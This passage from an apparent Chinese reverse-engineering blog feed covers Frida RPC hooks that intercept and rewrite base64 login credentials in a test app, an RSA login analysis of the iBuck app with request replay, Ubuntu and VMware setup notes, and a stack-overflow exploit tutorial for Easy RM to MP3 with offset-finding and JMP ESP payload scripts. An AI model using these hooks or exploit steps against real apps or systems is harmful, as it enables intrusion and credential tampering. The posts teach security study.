<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123152036237.png" class="" title="image-20231123152036237">

<p>先执行这个脚本看是否起作用了</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123152644869.png" class="" title="image-20231123152644869">

<ul>
<li>起作用了我们开始进行下一步的RPC调用</li>
</ul>
<p>RPC注入的脚本：</p>
<blockquote>
<p>PS：<strong>Amazon CodeWhisperer</strong>的代码智能提示挺好用的，支持中文还免费</p>
</blockquote>
<h6 id="lesson7-lesson4-js"><a href="#lesson7-lesson4-js" class="headerlink" title="lesson7_lesson4.js"></a>lesson7_lesson4.js</h6><pre><code class="js">function invoke(){
    Java.perform(function(){
        Java.choose("com.xiaoeryu.lesson4_4.MainActivity",{
            onMatch:function(instance){
                console.log("found instance: ", instance)
                console.log("found instance: ", instance.secret())
            },onComplete:function(){}
        })
    })
}

// setTimeout(invoke, 3000);

rpc.exports = {
    invokefunc:invoke
}
</code></pre>
<h6 id="lesson7-loader-py"><a href="#lesson7-loader-py" class="headerlink" title="lesson7_loader.py"></a>lesson7_loader.py</h6><pre><code class="python">import time
import frida

def my_message_handler(message, payload):
    # 处理Frida脚本发送的消息
    print(message)
    print(payload)

# 获取连接到计算机的USB设备，通常是Android设备
device = frida.get_usb_device()

# ==============================
# 选择一种注入方式（方式1或方式2），注释掉另一种方式

# Way 1: 通过spawn方式创建进程并附加
# pid = device.spawn(["com.xiaoeryu.lesson4_4"])
# device.resume(pid)
# time.sleep(1)
# session = device.attach(pid)

# Way 2: 直接绑定到指定的进程
session = device.attach("com.xiaoeryu.lesson4_4")  # 绑定指定进程
# ==============================

# 打开名为lesson7_lesson4.js的Frida脚本文件
with open("lesson7_lesson4.js") as f:
    # 创建Frida脚本对象并加载脚本内容
    script = session.create_script(f.read())

# 将my_message_handler函数注册为脚本的消息处理程序
script.on("message", my_message_handler)

# 加载脚本到目标应用程序中，使其开始执行
script.load()

command = ""
while True:
    # 等待用户输入命令，提示符为&gt;&gt;&gt;
    command = input("&gt;&gt;&gt;")
    if command == "1":
        # 如果用户输入为"1"，跳出循环，结束程序
        break
    elif command == "2":
        # 如果用户输入为"2"，调用Frida脚本中导出的invokefunc函数
        script.exports.invokefunc()
</code></pre>
<h6 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h6><img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123154646447.png" class="" title="image-20231123154646447">



<h2 id="多主机多手机多端口混连"><a href="#多主机多手机多端口混连" class="headerlink" title="多主机多手机多端口混连"></a>多主机多手机多端口混连</h2><p>先把手机的<code>wifi adb</code>打开</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123155524543.png" class="" title="image-20231123155524543">

<p>打开frida-server绑定9999端口</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123155724093.png" class="" title="image-20231123155724093">

<ul>
<li>现在我们局域网下面的设备就都可以使用adb命令连接<strong>192.168.1.7</strong>这台设备了</li>
</ul>
<p>修改一下我们的python脚本为远程连接</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123161455296.png" class="" title="image-20231123161455296">

<p>打印设备的信息也是可以的</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231123162159622.png" class="" title="image-20231123162159622">

<h2 id="互联互通、动态修改、上传到PC打印"><a href="#互联互通、动态修改、上传到PC打印" class="headerlink" title="互联互通、动态修改、上传到PC打印"></a>互联互通、动态修改、上传到PC打印</h2><h5 id="下面先写一下用来测试的登陆界面，然后截取登陆界面的用户名和密码并修改"><a href="#下面先写一下用来测试的登陆界面，然后截取登陆界面的用户名和密码并修改" class="headerlink" title="下面先写一下用来测试的登陆界面，然后截取登陆界面的用户名和密码并修改"></a>下面先写一下用来测试的<a href="https://github.com/xiaoeeyu/lesson7sec">登陆界面</a>，然后截取登陆界面的用户名和密码并修改</h5><blockquote>
<p>PS：使用下载的代码的时候最好把IDE的代理挂上，不然有些包下载不下来各种报错</p>
</blockquote>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231124110117380.png" class="" title="image-20231124110117380">

<ul>
<li>在这里我们设置一下不允许使用<em>admin</em>用户名登陆，后面hook后强制修改</li>
<li>然后把输入的用户名和密码<code>base64</code>后传给服务端</li>
<li>可以通过HOOK <code>message_tv.setText()</code>来拿到base64后的用户名和密码</li>
</ul>
<h6 id="编写hook脚本"><a href="#编写hook脚本" class="headerlink" title="编写hook脚本"></a>编写hook脚本</h6><p><code>setText()</code>是一个通用函数肯定有多个重载，可以先确定这里使用的是哪个重载</p>
<ul>
<li><p>使用objection来确定一下使用了哪个重载</p>
<blockquote>
<ul>
<li>这里frida-server不小心断开了，重连了一遍，所以端口改为了8888</li>
</ul>
</blockquote>
<blockquote>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231124111105937.png" class="" title="image-20231124111105937">

<ul>
<li><code>Called android.widget.TextView.setText(java.lang.CharSequence)</code></li>
</ul>
</blockquote>
</li>
</ul>
<pre><code class="js">function main(){
    Java.perform(function(){
        Java.use("android.widget.TextView").setText.overload('java.lang.CharSequence').implementation = function(x){
            console.log("TextView.setText: " + x)
            return this.setText(x)
        }
    })
}
setImmediate(main)
</code></pre>
<ul>
<li><p>在使用RPC之前先试一下本地调用是否ok</p>
<blockquote>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231124112824466.png" class="" title="image-20231124112824466">

<ul>
<li>测试ok，开始修改脚本去跟服务端联动</li>
</ul>
</blockquote>
</li>
</ul>
<h6 id="修改脚本：添加发送和接收进行RPC联动"><a href="#修改脚本：添加发送和接收进行RPC联动" class="headerlink" title="修改脚本：添加发送和接收进行RPC联动"></a>修改脚本：添加发送和接收进行RPC联动</h6><p>修改后的<strong>lesson7sec.js</strong></p>
<pre><code class="js">Java.perform(function(){
    Java.use("android.widget.TextView").setText.overload('java.lang.CharSequence').implementation = function(x){
        var string_to_send_x = x.toString()
        var string_to_recv
        send(string_to_send_x)
        recv(function(recv_json_objection){
            string_to_recv = recv_json_objection.my_data
            // x = string_to_recv.toString()
            console.log("string_to_recv: " + string_to_recv)
        }).wait()
        var javaStringToSend = Java.use("java.lang.String").$new(string_to_recv)

        var result = this.setText(javaStringToSend)
        // console.log("TextView.setText: " + x)
        return result
    }
})
</code></pre>
<p><strong>lesson7secLoader.py</strong></p>
<pre><code class="python">import time
import frida
import base64

# 定义消息处理函数
def my_message_handler(message, payload):
    # 打印接收到的消息和负载
    print(message)
    print(payload)

    # 检查消息类型是否为 "send"
    if message["type"] == "send":
        # 打印接收到的负载数据
        print(message["payload"])

        # 解码 base64 编码的数据，并转换为字符串
        data = message["payload"].split(":")[1].strip()
        data = str(base64.b64decode(data), encoding="utf-8")
        print("解码后的数据: ", data)

        # 将解码后的数据拆分成用户名和密码
        usr, pw = data.split(":")
        print("密码: ", pw)

        # 将用户名替换为 "admin"，然后重新编码为 base64
        data = str(base64.b64encode(("admin" + ":" + pw).encode()))
        print("编码后的数据: ", data)

        # 向脚本发送修改后的数据
        script.post({"my_data": data})
        print("修改后的数据已发送！")

# 连接到远程设备
device = frida.get_device_manager().add_remote_device("192.168.1.7:8888")

# 附加到目标应用进程
session = device.attach("com.example.lesson7sec")

# 从文件中读取 JavaScript 脚本
with open("lesson7sec.js") as f:
    script = session.create_script(f.read())

# 设置消息处理回调函数
script.on("message", my_message_handler)

# 加载并执行 JavaScript 脚本
script.load()

# 等待输入，保持脚本运行
input()
</code></pre>
<ul>
<li><p>运行结果</p>
<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231124161614390.png" class="" title="image-20231124161614390"></li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>Frida HOOK</tag>
        <tag>RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu配置静态ip</title>
    <url>/2024/06/01/Ubuntu%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    <content><![CDATA[<p>例如要将Ubuntu虚拟机的IP地址更改为192.168.1.23，并且使用VMware的桥接模式，可以按照以下步骤进行：</p>
<p>环境：这里示例环境是Ubuntu22.04，在其它环境下可能也有所不同</p>
<h3 id="在VMware中设置桥接模式"><a href="#在VMware中设置桥接模式" class="headerlink" title="在VMware中设置桥接模式"></a>在VMware中设置桥接模式</h3><ol>
<li><strong>打开VMware并启动虚拟机</strong>： 确保你的Ubuntu虚拟机已启动并正在运行。</li>
<li><strong>进入虚拟机的设置</strong>： 右键点击虚拟机，然后选择“Settings”或“虚拟机设置”。</li>
<li><strong>选择网络适配器</strong>： 在设置窗口中，找到并选择“Network Adapter”（网络适配器）。</li>
<li><strong>选择桥接模式</strong>： 在网络适配器设置中，选择“Bridged: Connected directly to the physical network”（桥接：直接连接到物理网络）。确保取消勾选“Replicate physical network connection state”（复制物理网络连接状态）。</li>
</ol>
<h3 id="在Ubuntu中设置静态IP地址"><a href="#在Ubuntu中设置静态IP地址" class="headerlink" title="在Ubuntu中设置静态IP地址"></a>在Ubuntu中设置静态IP地址</h3><ol>
<li><p><strong>打开终端</strong>： 在Ubuntu虚拟机中打开终端。</p>
</li>
<li><p><strong>编辑Netplan配置文件</strong>： 使用<code>sudo</code>权限编辑Netplan配置文件。Netplan是Ubuntu用于管理网络配置的工具。通常，配置文件位于<code>/etc/netplan/</code>目录下，文件名可能是<code>01-netcfg.yaml</code>或类似的。</p>
<pre><code>sudo nano /etc/netplan/01-netcfg.yaml
</code></pre>
</li>
<li><p><strong>配置静态IP地址</strong>： 编辑配置文件，使其包含以下内容：</p>
<pre><code>network:
  version: 2
  ethernets:
    ens33:  # 确认接口名称是否为ens33，如果不同则修改为实际名称
      dhcp4: no
      addresses: [192.168.1.23/24]
      routes:
        - to: default
          via: 192.168.1.1  # 根据实际网关地址修改
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
</code></pre>
<p>请注意：</p>
<ul>
<li><code>ens33</code>是网络接口的名称，可能会根据具体情况有所不同，可以使用<code>ip a</code>命令查看实际的接口名称。</li>
<li><code>gateway4</code>设置为你的网关地址，通常是路由器的IP地址。</li>
</ul>
</li>
<li><p><strong>应用配置</strong>： 保存文件并退出编辑器，然后应用新的网络配置：</p>
<pre><code>sudo netplan apply
</code></pre>
</li>
<li><p><strong>验证配置</strong>： 使用以下命令检查IP地址是否已成功更改：</p>
<pre><code>ip a
</code></pre>
<p>确认网络接口已经获得了新的IP地址<code>192.168.1.23</code>。</p>
</li>
</ol>
<h3 id="确认网络连通性"><a href="#确认网络连通性" class="headerlink" title="确认网络连通性"></a>确认网络连通性</h3><ol>
<li><p><strong>检查连接</strong>： 在终端中使用<code>ping</code>命令检查是否可以连接到网关或其他网络设备：</p>
<pre><code>ping 192.168.1.1
</code></pre>
</li>
<li><p><strong>确保互联网连接</strong>： 还可以使用<code>ping</code>命令检查是否可以访问互联网：</p>
<pre><code>ping baidu.com
</code></pre>
</li>
</ol>
<p>这样，Ubuntu虚拟机的IP地址应该已经成功更改为192.168.1.23，并且连接到你的主机所在的网络上。如果在执行过程中遇到任何问题，请确保虚拟机网络适配器的设置正确，并且配置文件中的语法没有错误。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA加解密-iBuck</title>
    <url>/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/</url>
    <content><![CDATA[<p><strong>rsa加解密</strong></p>
<ul>
<li>RSA加密属于一种非对称加密算法，对于相同内容的每次加密结果也都是不一样的，但是用私钥解密后的结果却都是可还原的</li>
</ul>
<p>rsa生成的密匙对</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153627907.png" class="" title="image-20230709153627907">

<p>可以通过RSA的私钥提取公钥</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153656153.png" class="" title="image-20230709153656153">

<p>公钥提取modulus（模数）</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153710904.png" class="" title="image-20230709153710904">

<h3 id="1-分析iBuck登录加解密"><a href="#1-分析iBuck登录加解密" class="headerlink" title="1. 分析iBuck登录加解密"></a>1. 分析iBuck登录加解密</h3><p>本章只分析软件的登录加解密验证</p>
<h4 id="fiddler抓登陆包"><a href="#fiddler抓登陆包" class="headerlink" title="fiddler抓登陆包"></a>fiddler抓登陆包</h4><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153900282.png" class="" title="image-20230709153900282">

<p><strong>先通过frida-trace 寻找RSA加解密相关的函数接口</strong></p>
<p><code>frida-trace -m "*[* *rsa*]" -U iBuck</code></p>
<p><strong>找到相关函数接口</strong></p>
<p>+[BKDataEncrypManger bk_rsaDecryptForJson:0x280848cc0]<br>+[BKDataEncrypManger bk_rsaEncrypJsonForDictionary:0x282664b80]</p>
<p>然后可以通过hook接口获取到参数信息</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154215964.png" class="" title="image-20230709154215964">

<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154238135.png" class="" title="image-20230709154238135">

<p>再通过rsa的通杀脚本来获取密钥相关的信息</p>
<p><code>frida -U iBuick -l .\ios_rsa.js</code></p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154315544.png" class="" title="image-20230709154315544">

<p>接下来去ida解析的字符串里面搜索一下RSA公钥的编码特征看是否能搜到：一般是<strong>MIGfMA0</strong>开头的</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154348971.png" class="" title="image-20230709154348971">

<p>直接搜索到了三组硬编码，那接下来可以解析一下这三个硬编码的模数看哪一个和我们刚刚通过RSA通杀脚本获取到的模数相同。</p>
<p>通过计算获取到正确的那一组硬编码</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154420182.png" class="" title="image-20230709154420182">

<p>确定了之后，先在ida里面查看一下这个公钥的调用，通过交叉引用找到调用的函数</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154434989.png" class="" title="image-20230709154434989">

<p>到了这边之后发现只是返回了一个公钥的值，继续再往上一层查看可以跟到下图解密函数</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154446127.png" class="" title="image-20230709154446127">

<p>有点奇怪，第二天使用frida的时候报错</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154504743.png" class="" title="image-20230709154504743">

<ul>
<li>不知道是哪里的问题，重启刷机好了</li>
</ul>
<p>找到这个解密函数之后，可以对解密函数进行hook查看它的参数和返回结果去验证他的解密过程</p>
<p><em>插入log获取参数和返回值</em></p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154558580.png" class="" title="image-20230709154558580">

<p>执行hook</p>
<p><code>frida-trace -m "*[BKRSA decryptString:publicKey*]" -U iBuick</code></p>
<p>重新点击登录查看参数和返回值的值</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154622285.png" class="" title="image-20230709154622285">

<p><strong>从这里可以获知两点：</strong></p>
<p>a. 未解密字符串的值是服务器的返回包，可以在fiddler里面找到</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154641117.png" class="" title="image-20230709154641117">

<p>b. 这个公钥是用来解密返回包的，解密的返回值是**{}**</p>
<p>既然它是用公钥来解密服务端返回的数据包，这里我们可以猜测这个加密逻辑是：</p>
<p>​	在客户端使用公钥加密-&gt;发送到服务器用私钥解密</p>
<p>​	在服务端使用私钥加密-&gt;发送给客户端用公钥解密</p>
<p>来验证确认一下：</p>
<p>在ida里面搜索加密相关函数发现使用公钥私钥的都有，那我们接下来使用<em>frida-trace</em>来hook确认一下解密服务器返回包的时候调用的是哪个函数</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154712851.png" class="" title="image-20230709154712851">

<p><code>frida-trace -m "*[BKRSA enc*]" -U iBuick</code></p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154727247.png" class="" title="image-20230709154727247">

<p>根据hook返回结果发现是使用BKRSA encryptString:privateKey函数私钥加密，那接下来插入log来查看一下它的参数和返回值</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154757109.png" class="" title="image-20230709154757109">

<p>执行hook</p>
<p><code>frida-trace -m "*[BKRSA encryptString:privateKey*]" -U iBuick</code><br>返回值：</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154818632.png" class="" title="image-20230709154818632">

<p>接下来验证一下：</p>
<ol>
<li>用公钥解密服务器下发的data包</li>
</ol>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154835268.png" class="" title="image-20230709154835268">

<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154844888.png" class="" title="image-20230709154844888">

<ol start="2">
<li>用私钥加密重放发送给服务器看能否通过验证</li>
</ol>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154906562.png" class="" title="image-20230709154906562">

<p>验证通过，和我们点击登录返回相同的结果（这个app有限时防重放机制，发送时间过去太长的包重放是会失败的）</p>
<img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154939287.png" class="" title="image-20230709154939287">

<p>根据验证的结果发现，本app在客户端有两对密匙，两种加密方式，一种是使用公钥加密服务端私钥解密，一种是使用私钥加密服务端公钥解密</p>
<p>关于这个app加固可以把客户端存储的密钥进行加密，例如将密钥存储为文件通过解密文件解析出公钥会让安全性更高一点</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>加密解密</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware问题汇总</title>
    <url>/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>记录一下，VMware使用过程中出现的问题以及解决方法</p>
<span id="more"></span>

<h3 id="恢复快照出错"><a href="#恢复快照出错" class="headerlink" title="恢复快照出错"></a>恢复快照出错</h3><p>有时候在恢复快照的时候会出现找不到所需文件，无法恢复快照的问题</p>
<p>找到虚拟机的.vmx文件将第一个<code>scsi0.present</code>字段改为<code>FALSE</code>之后再恢复快照即可</p>
<img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/image-20210609104305024.png" class="" title="image-20210609104305024">

<h3 id="安装vmtools按钮灰色无法安装vmtools"><a href="#安装vmtools按钮灰色无法安装vmtools" class="headerlink" title="安装vmtools按钮灰色无法安装vmtools"></a>安装vmtools按钮灰色无法安装vmtools</h3><p>将存储设置都改为自动检测即可，重新开机就可以重新安装vmtools了</p>
<img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1614876729(1).png" class="" title="1614876729(1)">



<p>如果ubuntu22.04安装的vmtools不起作用，试试安装<code>open-vm-tools-desktop</code></p>
<p><code>sudo apt-get install open-vm-tools-desktop</code></p>
<p>安装之后<mark>重启切换用户到<strong>xorg</strong></mark></p>
<img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/image-20231005110249523.png" class="" title="image-20231005110249523">

<ul>
<li>有时候重启切换用户不生效，就注销用户重新切换一下</li>
</ul>
<img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/image-20231005111256641.png" class="" title="image-20231005111256641">
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit编写系列1:Easy RM to MP3 漏洞调试</title>
    <url>/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="Easy-RM-to-MP3-漏洞调试"><a href="#Easy-RM-to-MP3-漏洞调试" class="headerlink" title="Easy RM to MP3 漏洞调试"></a>Easy RM to MP3 漏洞调试</h1><h3 id="0X00前言"><a href="#0X00前言" class="headerlink" title="0X00	前言"></a>0X00	前言</h3><p>分析这个漏洞主要是为了学习怎么通过调试并编写溢出类型漏洞的EXP</p>
<h3 id="0X01分析环境"><a href="#0X01分析环境" class="headerlink" title="0X01	分析环境"></a>0X01	分析环境</h3><table>
<thead>
<tr>
<th>调试环境</th>
<th>版本</th>
</tr>
</thead>
<tbody><tr>
<td>系统版本</td>
<td>XP_sp3</td>
</tr>
<tr>
<td>Easy RM to MP3</td>
<td>2.7.3.700</td>
</tr>
<tr>
<td>windbg</td>
<td>6.12</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="0X02漏洞描述"><a href="#0X02漏洞描述" class="headerlink" title="0X02	漏洞描述"></a>0X02	漏洞描述</h3><p>这个漏洞是一个典型的溢出类型漏洞，在处理字符的时候没有对长度做限制，在读取到第25000~30000个字符的时候会导致返回地址被覆盖导致溢出</p>
<h3 id="0X03漏洞分析"><a href="#0X03漏洞分析" class="headerlink" title="0X03	漏洞分析"></a>0X03	漏洞分析</h3><p>编写perl脚本生成漏洞验证文件</p>
<pre><code class="perl">my $file= "crash25000.m3u";
my $junk = "\x41" x 25000;
my $junk2 = "\x42" x 5000;
open($FILE,"&gt;$file");
print $FILE $junk.$junk2;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>打开cmd输入命令<code>windbg.exe -I</code>，将windbg设置为默认调试器。</p>
<p>用 Easy RM to MP3 打开perl脚本生成的”crash25000.m3u”</p>
<p>windbg会自动捕获异常附加调试</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201210234341795.png" class="" title="image-20201210234341795">

<p>可以看到 EIP 为42424242（BBBB），可以验证返回地址位于25000~30000之间。</p>
<p>我们下一步需要定位漏洞的具体位置：一般来说有两种方法：</p>
<ol>
<li>通过调试查看栈回溯查看堆栈的方式来确定溢出的位置。</li>
<li>将我们刚来写入字符“B”的位置填充为pattern字符串，观察程序崩溃时的 EIP来定位返回地址在缓冲区中的偏移。</li>
</ol>
<p>第二种方式无疑是比较简单方便的，我们就采用第二种方式来定位偏移。</p>
<p>​	使用metasploit framework文件夹下tool文件夹中的pattern_create.rb工具来创建一个包含5000个字符的模型替换刚才的“B”字符。</p>
<p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_create.rb -l 5000</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000614971.png" class="" title="image-20201211000614971">

<p>重新加载崩溃后可以看到 EIP 的值改变了</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000800904.png" class="" title="image-20201211000800904">

<p>此时 EIP = 0x366a4235（小端字节序：35 42 6a 36 = 5Bj6）</p>
<p>再次使用 metasploit 的工具 pattern_offset.rb 来计算偏移值：</p>
<p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_offset.rb -q 5Bj6</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211004850534.png" class="" title="image-20201211004850534">

<p>偏移位置 = 25000 + 1067</p>
<p>接下来我们可以重新设计一下payload来验证我们计算的偏移是否正确：</p>
<pre><code class="perl">my $file= "eipcrash.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB";
my $espdata = "C" x 1000;
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>然后用生成的 “eipcrash.m3u”再次触发崩溃</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211005529815.png" class="" title="image-20201211005529815">

<p>可以看到 EIP 已经被我们写入的四个字节的 “B”覆盖掉了，此时我们已经可以控制 EIP 了，接下来我们需要考虑一下怎么让EIP指向我们的shellcode，以及如何把shellcode放到被攻击的虚拟内存空间并让EIP指向它并执行。</p>
<p>现在栈视图如下：</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213165731693.png" class="" title="image-20201213165731693">

<p>当函数返回时”BBBB”被放入EIP中执行，我们可以想办法让EIP指向我们存放shellcode的地址。</p>
<p>重新设计一下我们的shellcode：</p>
<ol>
<li>写入26067个”A”</li>
<li>EIP”BBBB”</li>
<li>用模型字符串替换刚才填入的字符”C”，确定一下ESP指向的地址是不是我们刚才填入的”C”开头第一个字符的位置（根据结果来调整我们的shellcode）。</li>
</ol>
<p>修改perl脚本：</p>
<pre><code class="perl">my $file= "test_1.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB";
my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>断下来之后可以看到ESP是从第五个字符开始的</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213190656563.png" class="" title="image-20201213190656563">

<p>这样我们可以修改一下shellcode将我们的payload往后面放放</p>
<p>现在我们可以考虑编写真正的shellcode了：</p>
<ol>
<li>我们可以控制EIP</li>
<li>我们知道可以在哪里存放我们的shellcode</li>
<li>将EIP指向ESP即可</li>
</ol>
<p>但是有一个问题，现在地址ESP(0x000ffd38)包含了终止字符(null:00)，如果我们直接使用这个地址的话执行到这个位置会引起中断从而达不到我们想要的效果</p>
<p>所以，需要换一种方法来让EIP指向我们的shellcode</p>
<p>我们可以选择在进程空间中找到一个<em>JMP ESP的地址（地址中不含00）</em>来帮助我们将EIP指向shellcode</p>
<p>jmp esp 的opcode是 ffe4，我们可以在加载的DLL里面搜索这个指令：s 019e0000 l 01ead000 ff e4</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213211505350.png" class="" title="image-20201213211505350">

<p>现在我们可以将EIP设置为0x01b9f23a，在进行测试一下，看看是否如我们所料能跳转进我们的shellcode中</p>
<pre><code class="perl">my $file= "test_2.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x01b9f23a);;
my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
